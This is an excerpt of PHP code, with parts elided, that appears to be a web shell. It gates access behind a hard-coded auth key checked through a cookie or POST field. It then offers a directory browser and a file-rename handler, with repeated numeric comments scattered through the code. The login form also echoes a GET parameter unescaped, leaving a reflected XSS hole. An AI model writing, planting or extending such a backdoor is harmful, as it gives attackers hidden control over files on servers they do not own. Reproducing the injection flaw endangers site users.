...
$auth_key = "92d58a066bdb5ec4e3332868fc98135d";
...
$pass = false;
if (isset($_COOKIE['pw_name_45601'])) {
    if(($_COOKIE['pw_name_45601']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_45601'])) {
        if(($_POST['pw_name_45601']) == $auth_key) {
            setcookie("pw_name_45601", $_POST['pw_name_45601']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_45601' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1727391928137073 1727391928328498 1727391928671012 1727391928861612
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1727391928137073 1727391928328498 1727391928671012 1727391928861612
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1727391928137073 1727391928328498 1727391928671012 1727391928861612
            $name = PATH . "/" . $_GET['r'];
